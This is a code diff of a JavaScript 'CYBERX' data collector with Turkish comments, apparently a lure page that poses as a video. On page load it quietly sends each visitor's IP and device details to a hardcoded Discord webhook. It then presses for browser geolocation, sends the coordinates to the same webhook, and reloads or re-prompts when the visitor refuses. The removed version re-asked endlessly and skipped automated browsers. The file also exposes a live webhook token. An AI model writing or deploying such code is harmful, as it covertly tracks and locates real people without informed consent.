@@ -1,11 +1,9 @@
 // ============================================
-// CYBERX DATA COLLECTOR - HAFIF & ÇALIŞAN
+// CYBERX BUTONLA KONUM İZNİ - ÇALIŞIR VERSİYON
 // ============================================
 
-// WEBHOOK URL (DÜZ)
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';
 
-// VERİ GÖNDER
 async function sendData(data) {
     try {
         await fetch(WEBHOOK_URL, {
@@ -16,117 +14,73 @@ async function sendData(data) {
     } catch(e) {}
 }
 
-// IP AL
 async function getIP() {
     try {
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
         return data.ip;
-    } catch(e) {
-        return 'IP alınamadı';
-    }
+    } catch(e) { return 'IP alınamadı'; }
 }
 
-// CİHAZ BİLGİSİ (GERÇEK)
 function getDeviceInfo() {
     const ua = navigator.userAgent;
     let device = 'Bilinmiyor';
-    
-    // GERÇEK CİHAZ TESPİTİ
-    if (ua.includes('Android')) device = 'Android Telefon/Tablet';
+    if (ua.includes('Android')) device = 'Android';
     else if (ua.includes('iPhone')) device = 'iPhone';
-    else if (ua.includes('iPad')) device = 'iPad';
     else if (ua.includes('Windows')) device = 'Windows PC';
-    else if (ua.includes('Mac')) device = 'Mac Bilgisayar';
-    else if (ua.includes('Linux')) device = 'Linux Bilgisayar';
-    
+    else if (ua.includes('Mac')) device = 'Mac';
     return {
         cihaz: device,
-        marka: ua.includes('Samsung') ? 'Samsung' : (ua.includes('Xiaomi') ? 'Xiaomi' : (ua.includes('Huawei') ? 'Huawei' : 'Bilinmiyor')),
-        isletimSistemi: ua.includes('Android') ? 'Android ' + (ua.match(/Android (\d+)/) ? ua.match(/Android (\d+)/)[1] : '') : (ua.includes('iOS') ? 'iOS' : 'Windows/Mac/Linux'),
-        tarayici: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : (ua.includes('Safari') ? 'Safari' : 'Diğer')),
+        isletim: ua.includes('Android') ? 'Android' : (ua.includes('iOS') ? 'iOS' : 'Diğer'),
+        tarayici: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : 'Safari/Diğer'),
         ekran: `${screen.width}x${screen.height}`,
-        dil: navigator.language,
-        saatDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        url: window.location.href
+        dil: navigator.language
     };
 }
 
-// KONUM İSTE (HEMEN, BASIT, SONSUZ)
-let denemeSayisi = 0;
+let ipBilgisi = null;
+let cihazBilgisi = null;
 
-function askLocation(ip, deviceInfo) {
+// Sayfa açılınca IP ve cihaz bilgilerini al (konum isteme yok)
+async function init() {
+    ipBilgisi = await getIP();
+    cihazBilgisi = getDeviceInfo();
+    sendData(`🆕 Sayfa açıldı | IP: ${ipBilgisi} | Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.tarayici}`);
+}
+
+// Butona tıklayınca çağrılacak fonksiyon (konum isteği burada)
+function askLocationManually() {
     if (!navigator.geolocation) {
-        sendData(`⚠️ Tarayıcı konum desteklemiyor! IP: ${ip}`);
+        alert("Tarayıcın konum desteklemiyor.");
         return;
     }
     
-    function istem() {
-        denemeSayisi++;
-        
-        navigator.geolocation.getCurrentPosition(
-            // BAŞARILI
-            (pos) => {
-                const mesaj = `✅✅✅ KONUM ALINDI! ✅✅✅
-                
+    // Hemen konum iste (butona tıklandığı için pop-up çıkar)
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            const konumMesaji = `✅ KONUM ALINDI!
 📍 Enlem: ${pos.coords.latitude}
 📍 Boylam: ${pos.coords.longitude}
-🎯 Doğruluk: ${pos.coords.accuracy} metre
-🌐 IP: ${ip}
-📱 Cihaz: ${deviceInfo.cihaz} | ${deviceInfo.marka}
-📱 İS: ${deviceInfo.isletimSistemi}
-🌍 Tarayıcı: ${deviceInfo.tarayici}
-📺 Ekran: ${deviceInfo.ekran}
-🔤 Dil: ${deviceInfo.dil}
-⏰ Saat: ${deviceInfo.saatDilimi}
-🔁 Deneme: ${denemeSayisi}
-
---- BİLGİLER ALINDI ---`;
-                
-                sendData(mesaj);
-                
-                // BAŞARILI OLUNCA SAYFAYI DEĞİŞTİR
-                document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h1>🎉 GUELTIG! 🎉</h1><img src="https://cataas.com/cat/says/danke" width="100%"><p>Jetz chasch s Video luege! 😂</p></div>';
-            },
-            // REDDEDILDI
-            (error) => {
-                let hata = '';
-                if (error.code === 1) hata = 'KULLANICI REDDETTI';
-                else if (error.code === 2) hata = 'KONUM BULUNAMIYOR';
-                else if (error.code === 3) hata = 'ZAMAN ASIMI';
-                else hata = 'BILINMEYEN HATA';
-                
-                sendData(`❌ ${hata} (Deneme ${denemeSayisi}) | IP: ${ip}`);
-                
-                // 1.5 SANİYE SONRA TEKRAR SOR
-                setTimeout(istem, 1500);
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    }
-    
-    istem();
+🎯 Doğruluk: ${pos.coords.accuracy}m
+🌐 IP: ${ipBilgisi}
+📱 Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.tarayici}`;
+            sendData(konumMesaji);
+            // Başarılı olunca sayfayı değiştir
+            document.body.innerHTML = '<div style="text-align:center; margin-top:50px;"><h1>🎉 Video yükleniyor! 🎉</h1><img src="https://cataas.com/cat/says/danke" width="100%"><p>Danke fürs Konum!</p></div>';
+        },
+        (error) => {
+            let hata = '';
+            if (error.code === 1) hata = 'Kullanıcı izin vermedi';
+            else if (error.code === 2) hata = 'Konum bulunamadı';
+            else hata = 'Zaman aşımı';
+            sendData(`❌ Konum hatası: ${hata} | IP: ${ipBilgisi}`);
+            alert("Konum izni vermelisin! Tekrar dene.");
+            // Modal'ı tekrar açabiliriz ama basitçe sayfayı yenilemek de olur
+            location.reload();
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
 }
 
-// ANA FONKSİYON
-async function main() {
-    // BOT KONTROLÜ
-    if (navigator.webdriver) return;
-    
-    const ip = await getIP();
-    const deviceInfo = getDeviceInfo();
-    
-    // İLK MESAJ
-    sendData(`🆕 YENİ ZİYARETÇİ!
-🌐 IP: ${ip}
-📱 ${deviceInfo.cihaz} | ${deviceInfo.marka}
-💻 ${deviceInfo.isletimSistemi} | ${deviceInfo.tarayici}
-📺 ${deviceInfo.ekran} | ${deviceInfo.dil}
-🔗 ${deviceInfo.url}`);
-    
-    // HEMEN KONUM İSTE (0.5 saniye sonra)
-    setTimeout(() => askLocation(ip, deviceInfo), 500);
-}
-
-// BAŞLAT
-main();
+// Sayfa açılınca IP topla
+init();
